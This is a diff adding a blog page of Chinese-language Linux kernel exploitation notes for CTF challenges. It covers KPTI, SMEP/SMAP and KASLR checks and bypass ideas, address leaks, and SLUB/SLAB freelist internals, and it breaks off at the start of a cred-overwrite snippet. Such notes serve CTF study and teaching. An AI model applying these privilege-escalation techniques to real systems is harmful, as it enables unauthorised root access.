@@ -1,0 +1,1011 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="一、查看保护                           1.KPTI       内核页表隔离，开启之后可以访问用户空间内存，但是不能执行用户空间代码 即无法直接通过构造swapgs_iretq的ROP来返回用户态，可参考绕过 Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com) 1cat &#x2F;sys&#x2F;d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kernel笔记汇总">
+<meta property="og:url" content="http://pig-007.github.io/2022/01/14/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="一、查看保护                           1.KPTI       内核页表隔离，开启之后可以访问用户空间内存，但是不能执行用户空间代码 即无法直接通过构造swapgs_iretq的ROP来返回用户态，可参考绕过 Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com) 1cat &#x2F;sys&#x2F;d">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201162023861.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181206238.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181206574.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181207963.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181208263.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201141705373.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131247422.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617711.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617882.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162018978.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141222234.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162010972.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131600906.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131521126.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141202734.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141209330.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162026812.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131601774.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162039052.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162040465.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162046044.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162049003.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162051067.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161521037.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524450.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524429.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161527850.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243725.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243644.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161703956.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161707520.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161750717.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161752331.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161815160.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161744323.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201171050239.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203082351317.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151105563.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151130591.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151136862.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247187.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201191247302.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021148186.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021149995.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203021152377.png">
+<meta property="article:published_time" content="2022-01-14T02:25:33.000Z">
+<meta property="article:modified_time" content="2022-03-16T13:52:57.049Z">
+<meta property="article:author" content="PIG-007">
+<meta property="article:tag" content="kernel笔记汇总">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201162023861.png"><title>kernel笔记汇总 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/01/14/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">kernel笔记汇总</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-16</span></span></div></header><div class="post-body">
+        <h1 id="一、查看保护"   >
+          <a href="#一、查看保护" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、查看保护" class="headerlink" title="一、查看保护"></a>一、查看保护</h1>
+      
+        <h2 id="1-KPTI"   >
+          <a href="#1-KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-KPTI" class="headerlink" title="1.KPTI"></a>1.KPTI</h2>
+      <p>内核页表隔离，开启之后可以访问用户空间内存，但是不能执行用户空间代码</p>
+<p>即无法直接通过构造swapgs_iretq的ROP来返回用户态，可参考绕过</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006#h3-2" >Linux Kernel KPTI保护绕过 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/devices/system/cpu/vulnerabilities/*</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201162023861.png" alt="image.png"></p>
+<p>这个也有类似的启动脚本</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-append &quot;console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot; \</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="2-SMEP、SMAP、KASLR等"   >
+          <a href="#2-SMEP、SMAP、KASLR等" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SMEP、SMAP、KASLR等" class="headerlink" title="2.SMEP、SMAP、KASLR等"></a>2.SMEP、SMAP、KASLR等</h2>
+      <p>这个直接看启动脚本</p>
+
+        <h3 id="1-SMEP和SMAP"   >
+          <a href="#1-SMEP和SMAP" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-SMEP和SMAP" class="headerlink" title="(1)SMEP和SMAP"></a>(1)SMEP和SMAP</h3>
+      <p>可以通过ROP修改CR3寄存器来绕过</p>
+
+        <h3 id="2-KASLR"   >
+          <a href="#2-KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-KASLR" class="headerlink" title="(2)KASLR"></a>(2)KASLR</h3>
+      <p>要么爆破，要么泄露地址，由于kaslr的随机化程度只有9bit，大概16*2=32次，所以很好爆破</p>
+<p>可以通过以下命令查看当前基地址</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep startup_64</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181206238.png" alt="image-20220118120655137"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181206574.png" alt="image-20220118120659509"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181207963.png" alt="image-20220118120702901"></p>
+<p>减去没有开启的KASLR的地址</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181208263.png" alt="image-20220118120852208"></p>
+<p>那么我们就可以假定这个offset来进行爆破了</p>
+
+        <h2 id="3-其他保护"   >
+          <a href="#3-其他保护" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-其他保护" class="headerlink" title="3.其他保护"></a>3.其他保护</h2>
+      
+        <h3 id="1-STACK-PROTECTOR"   >
+          <a href="#1-STACK-PROTECTOR" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-STACK-PROTECTOR" class="headerlink" title="(1)STACK PROTECTOR"></a>(1)STACK PROTECTOR</h3>
+      <p>类似用户态的cancary</p>
+
+        <h3 id="2-参考README-MD"   >
+          <a href="#2-参考README-MD" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-参考README-MD" class="headerlink" title="(2)参考README.MD"></a>(2)参考README.MD</h3>
+      <p>有时候出题人给的README.MD会给配置</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p>如上就是使用SLAB分配，开启RANDOM和HARDENED保护，以及Hardened Usercopy（在向内核拷贝数据时会进行检查，检查<strong>地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等</strong>）和 Static Usermodehelper Path（modprobe_path 为只读，不可修改）</p>
+<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解 - arttnba3’s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h1 id="二、泄露地址"   >
+          <a href="#二、泄露地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、泄露地址" class="headerlink" title="二、泄露地址"></a>二、泄露地址</h1>
+      
+        <h2 id="1-前置地址"   >
+          <a href="#1-前置地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-前置地址" class="headerlink" title="1.前置地址"></a>1.前置地址</h2>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dmesg</span><br><span class="line">cat /proc/kallsyms</span><br><span class="line">cat /sys/module/module_name/sections/.text</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="2-获取基地址"   >
+          <a href="#2-获取基地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-获取基地址" class="headerlink" title="2.获取基地址"></a>2.获取基地址</h2>
+      <p>有UAF时通常可以打开/proc/self/stat来泄露地址，大小为0x20</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct seq_operations &#123;</span><br><span class="line">    void * (*start) (struct seq_file *m, loff_t *pos);</span><br><span class="line">    void (*stop) (struct seq_file *m, void *v);</span><br><span class="line">    void * (*next) (struct seq_file *m, void *v, loff_t *pos);</span><br><span class="line">    int (*show) (struct seq_file *m, void *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+
+        <h1 id="三、下载generic版本内核"   >
+          <a href="#三、下载generic版本内核" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、下载generic版本内核" class="headerlink" title="三、下载generic版本内核"></a>三、下载generic版本内核</h1>
+      
+        <h1 id="四、打印地址"   >
+          <a href="#四、打印地址" class="heading-link"><i class="fas fa-link"></i></a><a href="#四、打印地址" class="headerlink" title="四、打印地址"></a>四、打印地址</h1>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;0x%lx\n&quot;,leakAddr);</span><br></pre></td></tr></table></div></figure>
+
+<p>有时候不加<code>\n</code>打不出来</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define HEX(x) printf(&quot;[*]0x%016lx\n&quot;, (size_t)x)</span><br><span class="line">#define LOG(addr) printf(&quot;[*]%s\n&quot;, addr)</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+
+        <h1 id="五、搜索内存"   >
+          <a href="#五、搜索内存" class="heading-link"><i class="fas fa-link"></i></a><a href="#五、搜索内存" class="headerlink" title="五、搜索内存"></a>五、搜索内存</h1>
+      <p>当不知道内存在哪里时，可以使用peda的搜索功能，搜索地址范围，常常在操控栈时很好用</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &quot;galf&quot; 0xffffc900001d3f80 0xffffc900001d3f98</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201141705373.png" alt="image-20220114170510292"></p>
+
+        <h1 id="六、常见漏洞及利用"   >
+          <a href="#六、常见漏洞及利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、常见漏洞及利用" class="headerlink" title="六、常见漏洞及利用"></a>六、常见漏洞及利用</h1>
+      
+        <h2 id="1-堆"   >
+          <a href="#1-堆" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-堆" class="headerlink" title="1.堆"></a>1.堆</h2>
+      
+        <h3 id="前置知识"   >
+          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3>
+      <p>通常而言为两种分配方式SLUB或者SLAB，SLUB默认会带上SLAB，但是可以进行设置，比如在编译内核的时候，使用<code>CONFIG_SLUB=n</code>， <code>CONFIG_SLAB=y</code>这样编译出来的内核就一定是SLAB分配的了。</p>
+
+        <h4 id="kmalloc-caches"   >
+          <a href="#kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#kmalloc-caches" class="headerlink" title="kmalloc_caches"></a>kmalloc_caches</h4>
+      <p>作为一个<code>kmem_cache</code>的结构体数组，管理着多个<code>kmem_cache</code>结构体指针。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131247422.png" alt="image-20220313124755307"></p>
+<p>但是不同版本下，由于分配方式的不同，导致也会<code>kmalloc_caches</code>的结构有点变化</p>
+<p>比如在4.19.98的版本中，<code>kmalloc_caches</code>就只是一维数组</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617711.png" alt="image-20220313161710623"></p>
+<p>而在5.6的版本下，<code>kmalloc_caches</code>变成了二维数组</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131617882.png" alt="image-20220313161749775"></p>
+<p>多出来的两个一维空间，就存放了<code>kmalloc-rcl</code>和<code>dma-kmalloc</code>，实际上也是相同的</p>
+
+        <h4 id="SLUB下"   >
+          <a href="#SLUB下" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLUB下" class="headerlink" title="SLUB下"></a>SLUB下</h4>
+      <p>通常我们分配的chunk的<code>freelist</code>为<code>kmalloc_caches[xx].cpu_slab + CPUX_addr</code>，也就是先得到对应CPU分配的基地址，然后加上<code>cpu_slab</code>即为对应<code>kmalloc-xx</code>的<code>freelist</code>的实际地址，如下图可以看到</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162018978.png" alt="image-20220316201816364"></p>
+<p>这里我在itExp中绑定了使用CPU3进行分配</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __USE_GNU</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">cpu_set_t</span> cpu_mask;</span><br><span class="line">CPU_ZERO(&amp;cpu_mask);<span class="comment">//初始化为0</span></span><br><span class="line">CPU_SET(<span class="number">3</span>,&amp;cpu_mask);<span class="comment">//绑定CPU3运行程序</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="一维kmalloc-caches"   >
+          <a href="#一维kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#一维kmalloc-caches" class="headerlink" title="一维kmalloc_caches"></a>一维kmalloc_caches</h5>
+      <p><code>kmalloc_caches[1]~kmalloc_caches[13]</code>为<code>kmalloc-8</code>~`kmalloc-8k`</p>
+<p>而在只有一维空间的<code>kmalloc_caches</code>中，即不存在<code>kmalloc-rcl</code>和<code>dma-kmalloc</code>的版本下，比如4.19.98</p>
+<p>如下图可以看到，也是很顺利地放入CPU3对应的<code>kmalloc-32</code>的<code>freelist</code>中</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141222234.png" alt="image-20220314122243323"></p>
+<p>但是CPU个数的不同，分配的基地址通常也会发生变化，这个具体还是看<code>__per_cpu_offset</code>这个全局变量中保存的内容吧，具体的细节不太知道</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162010972.png" alt="image-20220316201020862"></p>
+<p>如图为4个CPU的情况，这个还是不太一样的。</p>
+
+        <h5 id="多维kmalloc-caches"   >
+          <a href="#多维kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#多维kmalloc-caches" class="headerlink" title="多维kmalloc_caches"></a>多维kmalloc_caches</h5>
+      <p><code>kmalloc_caches[0][1]~kmalloc_caches[0][13]</code>为<code>kmalloc-8</code>~`kmalloc-8k`</p>
+<p><code>kmalloc_caches[1][1]~kmalloc_caches[1][13]</code>为<code>kmalloc-rcl-8</code>~`kmalloc-rcl-8k`</p>
+<p><code>kmalloc_caches[2][1]~kmalloc_caches[2][13]</code>为<code>dma-kmalloc-8</code>~`dma-kmalloc-8k`</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131600906.png" alt="image-20220313160048795"></p>
+<p>内存管理如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131521126.png" alt="img"></p>
+<p>在二维空间的<code>kmalloc_caches</code>下，依据CPU的不同，有不同的<code>freelist</code>，比如在有4个CPU的情况下，我们将程序绑定在CPU3上，如上面提到的一样</p>
+<p>qemu启动效果之后，输入top，效果如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141202734.png" alt="image-20220314120253236"></p>
+<p>那么我们的<code>itExp</code>程序绑定的CPU3分配到的基地址即为<code>0xffff88800f380000</code>，结合<code>kmalloc_caches</code>中对应<code>kmalloc-xxx</code>下的<code>cpu_slab</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141209330.png" alt="image-20220314120914190"></p>
+<p>那么我们的<code>kmalloc-32</code>的<code>freelist</code>即为<code>0xffff88800f380000+0x2d260</code>，如下图可以看到，我们释放的chunk确实是放入了CPU3上对应的<code>kmalloc-32</code>的<code>freelist</code>中</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162026812.png" alt="image-20220316202605604"></p>
+<p>当然，在SLUB分配下，由于FD指针的存在，freelist更像是一个单向链表，freelist中的第一个chunk作为链表头依据FD指针串联起整个freelist</p>
+
+        <h4 id="仅SLAB下"   >
+          <a href="#仅SLAB下" class="heading-link"><i class="fas fa-link"></i></a><a href="#仅SLAB下" class="headerlink" title="仅SLAB下"></a>仅SLAB下</h4>
+      <p>同样也具备多维或者一维的<code>kmalloc_caches</code></p>
+<p><code>kmalloc_caches[0][1]~kmalloc_caches[0][2]</code>为<code>kmalloc-96~kmalloc-192</code></p>
+<p><code>kmalloc_caches[0][3]~kmalloc_caches[0][4]</code>不知道为什么没有</p>
+<p><code>kmalloc_caches[0][5]~kmalloc_caches[0][22]</code>为<code>kmalloc-32~kmalloc-4M</code></p>
+<p>同理对应的多维和一维也是类似的</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131601774.png" alt="image-20220313160119681"></p>
+<p>分配方式上有点不同，具体的比较复杂，可以参考如下：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/liuhangtiant/category_7929217.html" >(41条消息) slab内存管理方案学习记录_liuhangtiant的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>这种情况下的Chunk其实不带FD指针的，所以只用于<code>freelist</code>上即可，简单来说，slab的<code>freelist</code>更像是一个数组进行索引。</p>
+<ul>
+<li>首先找到索引，也就是<code>CPUX_addr + kmalloc_caches[xx][xx]cpu_cache</code>对应的值，以CPU3和kmalloc-1024为例：</li>
+</ul>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162039052.png" alt="image-20220316203909895"></p>
+<ul>
+<li>然后再找到freelist的地址，即<code>CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.entry</code></li>
+</ul>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162040465.png" alt="image-20220316204056370"></p>
+<p>其实通过观察我们可以知道，entry其实也就是<code>cpu_cache+0x10</code>而已。那么现在我们得到freelist的地址，就将其当作一个数组进行取用，比如这里的索引idx为2，那么我们下一次分配就会取freelist[2]这个obj，但是这里很奇怪，这个索引是从1开始的，如下：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162046044.png" alt="image-20220316204603914"></p>
+<p>下一次分配取到chunk是<code>0xffff88800d538400</code>而非<code>0xffff88800d538c00</code>，我感觉这个索引idx更像是一个计数，表示还剩2个chunk可用，从尾部开始取用</p>
+
+        <h5 id="🔺注："   >
+          <a href="#🔺注：" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：" class="headerlink" title="🔺注："></a>🔺注：</h5>
+      <p>当然以上的情况实际操作起来太麻烦，还不如写个小插件，自己进行计算</p>
+<p>参考自己写的小工具：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/kernelAll" >PIG-007/kernelAll (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h6 id="SLAB："   >
+          <a href="#SLAB：" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLAB：" class="headerlink" title="SLAB："></a>SLAB：</h6>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162049003.png" alt="image-20220316204859800"></p>
+
+        <h6 id="SLUB："   >
+          <a href="#SLUB：" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLUB：" class="headerlink" title="SLUB："></a>SLUB：</h6>
+      <p>这个带上了计算swab和random值得功能，也就是开启了harden的情况下，当然也还有FD偏移位置改变的情况，不过需要设置</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162051067.png" alt="image-20220316205100876"></p>
+
+        <h3 id="修改cred结构体"   >
+          <a href="#修改cred结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改cred结构体" class="headerlink" title="修改cred结构体"></a>修改cred结构体</h3>
+      <p>这个就不用说太多，通常是0xa8大小的结构体，清空前28bits</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> credBuf[<span class="number">0xa8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">addFun(fd,<span class="number">0xa8</span>,credBuf);</span><br><span class="line">freeFun(fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span 